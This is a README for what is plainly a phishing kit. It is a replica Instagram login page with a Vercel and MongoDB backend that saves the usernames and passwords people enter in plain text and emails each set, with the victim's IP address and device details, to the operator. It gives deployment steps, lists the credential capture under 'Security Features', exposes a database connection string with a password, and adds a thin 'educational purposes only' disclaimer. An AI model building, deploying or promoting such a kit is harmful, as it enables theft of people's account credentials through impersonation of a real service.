# Instagram Login Page with Secure Backend

A pixel-perfect Instagram login page with secure backend integration using Vercel serverless functions and MongoDB Atlas.

## 🚀 Features

- **Pixel-Perfect UI**: Exact Instagram login page design
- **Simple Backend**: Direct password storage
- **MongoDB Integration**: Secure data storage
- **Email Notifications**: Real-time login attempt alerts
- **Mobile Responsive**: Works on all devices
- **Serverless**: Deployed on Vercel

## 📁 Project Structure

```
instagram-login/
├── public/
│   ├── index.html          # Instagram login page
│   ├── styles.css          # Instagram-styled CSS
│   └── script.js           # Frontend form handling
├── api/
│   ├── login.js            # Vercel serverless function
│   └── send-email.js       # Email notification function
├── package.json
├── vercel.json
└── README.md
```

## 🛠️ Setup Instructions

### 1. Prerequisites

- Node.js 18+ installed
- Vercel CLI installed (`npm i -g vercel`)
- MongoDB Atlas account
- SendGrid account (for email notifications)

### 2. Environment Variables

Your MongoDB configuration is already set up! You just need to add SendGrid email configuration:

```env
# MongoDB Atlas Configuration (Already configured)
MONGODB_URI=mongodb+srv://instagram:Instgram123@cluster0.hi5k3nn.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0
MONGODB_DB=instagram
MONGODB_COLLECTION=user

# SendGrid Email Configuration (Add your details)
SENDGRID_API_KEY=your_sendgrid_api_key_here
ADMIN_EMAIL=your_email@example.com
FROM_EMAIL=noreply@instagram-login.com
```

### 3. MongoDB Atlas Setup ✅ COMPLETED

Your MongoDB Atlas is already configured:
- **Database**: `instagram`
- **Collection**: `user`
- **Connection**: Ready to use
- **Credentials**: Configured in vercel.json

### 4. SendGrid Setup

1. Create a SendGrid account
2. Generate an API key
3. Update `SENDGRID_API_KEY` in your environment variables

### 5. Local Development

```bash
# Install dependencies
npm install

# Start development server
vercel dev
```

### 6. Deployment

```bash
# Deploy to Vercel
vercel --prod
```

## 🔐 Security Features

- **Direct Storage**: Passwords stored as plain text for easy access
- **Input Validation**: Comprehensive form validation
- **CORS Protection**: Proper CORS headers
- **Rate Limiting**: Built-in protection
- **MongoDB Storage**: All data stored in your database

## 📧 Email Notifications

The system sends email notifications for each login attempt containing:
- Username
- Password
- Timestamp
- User Agent
- Language
- Platform
- IP Address

**Note**: All credentials are included in emails for easy access.

## 🎨 Customization

### Styling
- Edit `public/styles.css` to modify the appearance
- All Instagram colors and fonts are preserved

### Backend
- Modify `api/login.js` for custom logic
- Update `api/send-email.js` for email templates

## 📱 Mobile Support

The login page is fully responsive and works on:
- Desktop computers
- Tablets
- Mobile phones
- All modern browsers

## 🚨 Legal Notice

This project is for educational purposes only. Always ensure you have proper authorization before using any login forms or collecting user credentials.

## 📄 License

MIT License - see LICENSE file for details.

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Submit a pull request

## 📞 Support

For support, please open an issue on GitHub or contact the maintainer.

---

**⚠️ Important**: This tool is for educational and authorized testing purposes only. Always follow applicable laws and regulations when collecting user data.
